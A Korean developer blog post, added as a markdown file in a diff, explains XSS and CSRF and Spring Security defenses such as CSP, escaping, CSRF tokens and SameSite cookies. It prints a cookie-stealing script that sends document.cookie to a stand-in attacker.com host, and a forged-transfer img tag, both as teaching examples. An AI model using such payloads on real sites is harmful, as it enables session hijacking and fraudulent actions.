@@ -1,0 +1,117 @@
+---
+title: "XSS와 CSRF — 브라우저를 공격 도구로 만드는 방법"
+category: "CS"
+excerpt: "XSS와 CSRF는 이름이 비슷하지만 완전히 다른 공격이다. 둘 다 브라우저를 이용한다는 공통점이 있지만 공격 메커니즘이 다르다. Spring Security가 어떻게 방어하는지도 정리한다."
+---
+
+Spring Security 설정을 처음 봤을 때 `csrf().disable()`이 있었다. 아무 생각 없이 그냥 두었다.
+
+나중에 시니어가 "REST API면 CSRF 끄는 게 맞지만 이유는 알고 끄셨나요?"라고 물었다. 모르고 했던 것들이 항상 걸린다.
+
+## XSS: Cross-Site Scripting
+
+**내 웹사이트에 악성 스크립트를 심는 공격.**
+
+가장 단순한 예:
+
+```html
+<!-- 게시판 글쓰기에 이걸 입력하면? -->
+<script>
+  document.location='http://attacker.com/steal?cookie='+document.cookie
+</script>
+```
+
+이 내용이 그대로 HTML에 렌더링되면, 다른 유저가 이 게시글을 볼 때 스크립트가 실행된다. 쿠키가 공격자 서버로 전송된다.
+
+**왜 위험한가:** 브라우저의 Same Origin Policy를 우회한다. 같은 도메인에서 실행되는 JavaScript는 해당 도메인의 쿠키, localStorage, DOM에 모두 접근할 수 있다.
+
+**방어:**
+
+```java
+// Spring에서 응답에 Content-Security-Policy 헤더 추가
+@Configuration
+public class SecurityConfig extends WebSecurityConfigurerAdapter {
+    @Override
+    protected void configure(HttpSecurity http) throws Exception {
+        http.headers()
+            .contentSecurityPolicy("script-src 'self'"); // 자기 도메인 스크립트만 허용
+    }
+}
+```
+
+서버 사이드에서 출력 시 HTML 이스케이프:
+```java
+// Thymeleaf는 기본으로 이스케이프
+// <p th:text="${userInput}"> → &lt;script&gt;... 로 렌더링
+// 주의: th:utext는 이스케이프 안 함 (그래서 쓰면 안 됨)
+```
+
+## CSRF: Cross-Site Request Forgery
+
+**다른 사이트에서 피해자를 이용해 요청을 위조하는 공격.**
+
+XSS가 내 사이트에 악성 스크립트를 심는 것이라면, CSRF는 완전히 다른 사이트에서 공격한다.
+
+공격 시나리오:
+
+```
+1. 피해자가 bank.com에 로그인 (세션 쿠키 생성)
+2. 공격자가 피해자에게 evil.com 링크를 보냄
+3. 피해자가 evil.com에 접속
+
+4. evil.com의 HTML:
+<img src="https://bank.com/transfer?to=attacker&amount=1000000">
+
+5. 브라우저가 bank.com으로 요청 보냄 (쿠키 자동 포함)
+6. bank.com은 세션 쿠키가 있으니 인증된 요청으로 처리
+7. 이체 완료
+```
+
+피해자는 악성 페이지를 방문했을 뿐이지만 자신의 브라우저가 공격 도구가 됐다.
+
+**CSRF 토큰으로 방어:**
+
+```java
+// Spring Security CSRF 기본 활성화
+// 모든 비멱등 요청에 CSRF 토큰 검증
+
+// Thymeleaf 폼에 자동으로 CSRF 토큰 추가
+// <input type="hidden" name="_csrf" value="랜덤토큰">
+
+// evil.com은 bank.com의 CSRF 토큰을 알 수 없으므로 위조 실패
+```
+
+**REST API에서 CSRF를 끄는 이유:**
+
+REST API는 보통 `Authorization: Bearer {token}` 헤더로 인증한다. 브라우저가 자동으로 포함하는 쿠키가 아니다. 공격자가 다른 사이트에서 이 헤더를 위조할 수 없으므로 CSRF 공격이 불가능하다.
+
+따라서 `SessionCreationPolicy.STATELESS` + JWT 인증 조합이면 `csrf().disable()`이 맞다.
+
+반대로 세션 쿠키 기반 인증이면 반드시 CSRF 보호를 켜야 한다.
+
+## 두 공격의 차이
+
+| | XSS | CSRF |
+|---|---|---|
+| 공격 위치 | 피해자 사이트 안 | 다른 사이트에서 |
+| 무엇을 이용 | JavaScript 실행 | 쿠키 자동 전송 |
+| 목적 | 세션 탈취, 데이터 도용 | 피해자 이름으로 액션 |
+| 방어 | CSP, 이스케이프 | CSRF 토큰, SameSite 쿠키 |
+
+## Same-Site 쿠키 속성
+
+현대적인 CSRF 방어:
+
+```
+Set-Cookie: sessionId=abc; SameSite=Strict
+```
+
+- `Strict`: 다른 사이트에서의 요청에는 쿠키 절대 포함하지 않음
+- `Lax`: 안전한 메서드(GET)에는 포함, POST 같은 데는 불포함
+- `None`: 항상 포함 (HTTPS 필수)
+
+SameSite=Strict이면 evil.com에서 bank.com으로 요청 시 쿠키가 전송되지 않는다. CSRF 원천 차단.
+
+## 회고
+
+보안 설정은 각각의 이유가 있다. 어떤 공격을 막기 위해 어떤 설정을 켜고 끄는지 알아야 한다. 모르고 켜고 끄면 내 서비스가 어떤 공격에 열려있는지 볼 수 없다.
